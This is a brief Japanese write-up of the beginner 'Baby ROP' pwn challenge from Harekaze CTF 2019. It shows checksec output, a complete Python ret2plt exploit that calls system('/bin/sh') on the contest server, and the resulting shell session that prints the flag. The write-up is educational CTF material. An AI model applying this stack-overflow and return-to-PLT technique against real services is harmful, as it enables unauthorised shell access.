# [pwn 100pts] Baby ROP - Harekaze CTF 2019
64ビットで基本無効です。
```
$ checksec -f babyrop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols     No	0		2	babyrop
```

IDAで解析すると、スタックオーバーフローがあることが分かります。
また、やさしいことにsystem関数のpltと"/bin/sh"という文字列がバイナリ中に存在するので、簡単にret2pltでシェルが呼べます。

```python
from ptrlib import *

#sock = Process("./babyrop")
sock = Socket("problem.harekaze.com", 20001)

plt_system = 0x400490
rop_pop_rdi = 0x00400683
addr_binsh = 0x601048

payload = b'A' * 0x18
payload += p64(rop_pop_rdi)
payload += p64(addr_binsh)
payload += p64(plt_system)
payload += p64(0xffffffffffffffff)
sock.sendline(payload)

sock.interactive()
```

libc-2.27とかだとなぜか`system("/bin/sh")`が失敗するのですが、問題文にUbuntu 16と書いてあったので安心です。
```
$ python solve.py 
[+] Socket: Successfully connected to problem.harekaze.com:20001
[ptrlib]$ cat /home/babyrop/flag
What's your name? HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}
[ptrlib]$
```

# 感想
初心者向けですね。
